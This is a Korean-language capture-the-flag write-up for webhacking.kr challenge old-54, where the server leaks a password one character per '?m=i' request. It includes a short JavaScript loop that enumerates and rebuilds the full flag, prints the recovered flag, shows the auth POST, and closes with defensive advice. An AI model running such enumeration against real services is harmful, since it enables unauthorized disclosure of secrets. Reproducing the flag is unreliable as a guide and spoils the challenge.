[webhacking.kr](https://webhacking.kr)의 **old-54** 문제를 풀었다.
SQL 인젝션도 필터 우회도 아니다. **서버가 비밀번호를 한 글자씩 그대로 내려주는** 문제다.
핵심은 두 가지다. 페이지의 자바스크립트가 `?m=0`, `?m=1`, … 을 순서대로 요청하면
서버가 **비밀번호의 그 위치 글자 하나**를 응답한다는 점, 그리고 화면에는
그 글자를 **덮어쓰며 마지막 하나만 보여줘서** 마치 비밀번호가 한 글자인 것처럼
**눈속임**한다는 점이다.

"화면에 뜨는 글자 받아적기"에서 멈추지 않고, **그 숫자 파라미터가 서버에서 실제로
무엇을 하는지**(음수·범위 밖까지 넣어가며)를 확인하고, **0부터 끝까지 훑어
비밀번호 전체를 복원**하는 과정을 직접 넣어 정리한다.
아래 내용은 전부 **실제로 서버에 요청을 넣어 응답을 확인한 것**이다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-54 (`/challenge/bonus-14/`) |
| 유형 | 정보 노출 / 클라이언트 측 눈속임 |
| 배점 | 10점 |
| 목표 | 비밀번호(`FLAG{...}`)를 알아내 **플래그 인증** |

페이지에 들어가면 큰 글씨로 **`Password is ?`** 만 떠 있다가,
잠시 뒤 숫자·글자 하나가 빠르게 바뀌며 지나가고 다시 `?`로 돌아간다.
무심코 보면 "비밀번호가 글자 하나인가?" 싶은, **딱 헷갈리게** 만든 화면이다.

## 2. 정보 수집 — 소스 코드

이 문제는 `view-source` 링크가 없지만, 동작 로직이 **전부 클라이언트(HTML/JS)에 있다.**
페이지 소스를 그대로 읽으면 다음과 같다.

```html
<h1><b>Password is <font id="aview">?</font></b></h1>
<script>
function run(){ /* XMLHttpRequest 객체 생성 */ }
x=run();
function answer(i){
  x.open('GET','?m='+i,false);   // 동기 요청으로 ?m=i 호출
  x.send(null);
  aview.innerHTML=x.responseText; // 받은 글자를 화면에 '덮어씀'
  i++;
  if(x.responseText) setTimeout("answer("+i+")",20);  // 응답 있으면 다음 글자
  if(x.responseText=="") aview.innerHTML="?";          // 빈 응답이면 '?'
}
setTimeout("answer(0)",1000);  // i=0부터 시작
</script>
```

읽어 보면 로직이 명확하다.

1. `answer(0)` 부터 시작해 **`?m=i`** 를 동기(`false`)로 요청한다.
2. 서버가 준 응답(`responseText`)을 `aview`에 **매번 덮어쓴다.**
3. 응답이 **비어 있지 않으면** `i`를 1 늘려 `answer(i)`를 20ms 뒤에 다시 호출한다.
4. 응답이 **빈 문자열이면** 멈추고 `aview`를 `?`로 되돌린다.

즉 서버의 `?m=i` 엔드포인트는 **비밀번호의 `i`번째 글자 하나**를 돌려준다.
자바스크립트는 그 글자들을 **이어 붙이지 않고** 화면에 하나씩 스쳐 지나가게만 한다.

## 3. 문제점 — 어디가 취약한가

### 3-1. 서버가 비밀번호를 "한 글자씩" 그대로 내려준다

이 문제의 본질은 **접근 통제 실패이자 정보 노출**이다.
비밀번호는 서버만 알아야 할 비밀인데, `?m=i` 라는 파라미터 하나로
**그 비밀의 임의 위치 글자를 아무 제한 없이 조회**할 수 있다.
한 번에 한 글자씩이라는 게 "안전장치"처럼 보이지만, 전혀 그렇지 않다.
`i`를 0, 1, 2… 로 바꿔가며 **몇 번만 더 요청하면** 전체가 그대로 드러난다.

파라미터의 동작을 못 박기 위해 **범위를 벗어난 값까지** 직접 넣어 봤다.

| 요청 | 응답 | 해석 |
| --- | --- | --- |
| `?m=0` | `F` | 0번째 글자 |
| `?m=1` | `L` | 1번째 글자 |
| `?m=5` | `a` | 5번째 글자 |
| `?m=37` | `}` | 마지막(37번째) 글자 |
| `?m=38` | `` (빈 문자열) | 길이를 넘어서면 빈 응답 → 종료 신호 |
| `?m=100` | `` (빈 문자열) | 역시 빈 응답 |
| `?m=-1` | `}` | **음수면 뒤에서부터** → 마지막 글자 |

`?m=-1`이 마지막 글자 `}`를 주는 건 결정적인 단서다.
이는 서버가 내부적으로 PHP `substr($password, $_GET['m'], 1)` 처럼
**입력 `m`을 그대로 문자열 오프셋으로 쓰고 있다**는 뜻이다
(PHP `substr`은 음수 오프셋을 "끝에서부터"로 해석한다).
입력값 검증 없이 비밀 문자열을 그대로 잘라 내보내고 있는 것이다.

### 3-2. "마지막 한 글자만" 보여주는 UI 눈속임

```js
aview.innerHTML = x.responseText;   // 이전 글자를 매번 덮어쓴다
```

자바스크립트는 글자를 받을 때마다 `aview`를 **덮어쓰기** 때문에,
화면에는 **항상 방금 받은 한 글자**만 남는다. 마지막엔 빈 응답을 받고 `?`로 돌아간다.
그래서 사람 눈에는 "글자 하나가 깜빡이다 사라지는" 것처럼 보일 뿐,
**지금까지 받은 글자들이 쌓인 전체 비밀번호**는 어디에도 표시되지 않는다.
하지만 그 글자들은 **이미 네트워크로 전부 내려왔다.** 화면에 안 보일 뿐이다.

> 핵심은 이것이다. **클라이언트가 숨겨서 보여주지 않는 것과, 서버가 보내지 않는 것은 전혀 다르다.**
> 브라우저로 내려온 데이터는 화면 표시 여부와 무관하게 **전부 읽을 수 있다.**

## 4. 익스플로잇 — 비밀번호 복원과 인증

공격은 단순하다. 화면이 하는 일(`?m=i` 요청)을 **그대로 하되, 글자를 이어 붙이고,
빈 응답이 올 때까지 반복**하면 된다.

### 4-1. `?m=i`를 0부터 훑어 전체 복원

문제 페이지(`/challenge/bonus-14/`)와 **같은 출처**에서 반복 요청해
각 글자를 이어 붙였다. 응답이 빈 문자열이면 비밀번호 끝이므로 중단한다.

```js
let pw = '';
for (let i = 0; i < 200; i++) {
  const r = await fetch('?m=' + i, { credentials: 'include' });
  const t = await r.text();
  if (t === '') break;   // 빈 응답 = 끝
  pw += t;               // 글자 이어 붙이기
}
// pw → "FLAG{a7981201c48d0ece288afd01ca43c55b}"  (길이 38)
```

결과는 길이 38의 비밀번호 **`FLAG{a7981201c48d0ece288afd01ca43c55b}`** 였다.
`?m=0`~`?m=37`이 각 글자를, `?m=38`이 빈 문자열(종료)을 돌려준 것과 정확히 일치한다.

### 4-2. 플래그 인증

webhacking.kr은 `FLAG{...}` 형식 문제를 상단 **Auth Flag** 모달에서 인증한다.
그 버튼이 호출하는 `authFlag()`는 `/auth.php`로 JSON을 POST한다.
같은 요청을 직접 보내 인증했다.

```js
await fetch('/auth.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ flag: 'FLAG{a7981201c48d0ece288afd01ca43c55b}' }),
  credentials: 'include'
}).then(r => r.text());
```

```console
POST /auth.php  {"flag":"FLAG{a7981201c48d0ece288afd01ca43c55b}"}
→ {"stat":true,"ret":"old-54 Pwned. You got 10point. Congratz!"}
```

## 5. 결과

복원한 플래그를 인증하자 서버가 바로 통과 처리했다.

```
old-54 Pwned. You got 10point. Congratz!
```

문제 목록에서도 **`✔️ old-54`** 로 풀린 것을 확인했다.

> 이 문제의 "비밀"은 서버 어딘가에 숨겨진 게 아니라, **애초에 브라우저로 전부 내려오고 있었다.**
> 화면이 한 글자씩 덮어쓰며 감추는 연출이 전부였을 뿐이다.

## 6. 왜 취약한가 — 그리고 올바른 방어

**(1) 비밀을 클라이언트로 보내지 마라 — "조금씩" 보내도 노출이다.**
한 번에 한 글자씩 내려준다고 비밀이 안전해지지 않는다.
공격자는 요청을 **반복**할 수 있으므로, 조각으로 나눠 보내는 것은
그냥 **통째로 보내는 것과 같다.** 비밀번호·토큰·플래그 같은 값은
검증은 **서버에서** 하고, 클라이언트에는 **판정 결과(참/거짓)만** 보낸다.

```php
// 나쁨: 비밀의 일부를 그대로 응답에 실어 보낸다
echo substr($password, $_GET['m'], 1);

// 좋음: 입력을 서버에서 비교하고, 결과만 돌려준다
echo (hash_equals($password, $_POST['guess'])) ? 'ok' : 'no';
```

**(2) 외부 입력을 문자열 오프셋·인덱스로 그대로 쓰지 마라.**
`substr($password, $_GET['m'], 1)`처럼 사용자 입력을 **그대로 오프셋**으로 쓰면,
`?m=-1`(끝에서부터)처럼 의도하지 않은 조회가 가능해지고,
다른 맥락에서는 **범위 밖 접근·인덱스 조작**으로 이어진다.
인덱스로 쓸 값은 **정수인지, 허용 범위 안인지** 반드시 검증한다.

**(3) "화면에 안 보임"을 보안으로 착각하지 마라.**
`aview`를 덮어써서 전체 비밀번호를 **표시하지 않는** 것은 UI 연출일 뿐이다.
네트워크 탭·`fetch` 한 줄이면 내려온 데이터는 전부 읽힌다.
클라이언트 측 숨김·난독화는 **공격자에게는 장애물이 아니다.**

## 7. 정리

- old-54는 **서버가 비밀번호를 `?m=i`로 한 글자씩 그대로 내려주는** 정보 노출 문제다.
- 화면은 `aview.innerHTML`을 **덮어써서 마지막 한 글자만** 보여주는 **눈속임**일 뿐, 글자들은 이미 전부 브라우저로 내려와 있다.
- `?m=-1`이 마지막 글자를 주는 걸로 보아 서버는 입력을 그대로 **`substr(password, m, 1)`** 오프셋으로 쓴다 — `i`를 0부터 훑으면 **`FLAG{a7981201c48d0ece288afd01ca43c55b}`** 전체가 복원된다.
- 복원한 플래그를 `/auth.php`에 인증하면 통과한다.
- 실무 교훈: **비밀은 조각으로도 클라이언트에 보내지 말고**(결과만 반환), **외부 입력을 오프셋/인덱스로 그대로 쓰지 말며**, **"화면에 안 보임"을 보안으로 여기지 않는다.**

> "서버가 무엇을 화면에 보여주는가"가 아니라 "서버가 애초에 무엇을 **내보내는가**"를 먼저 묻는다.
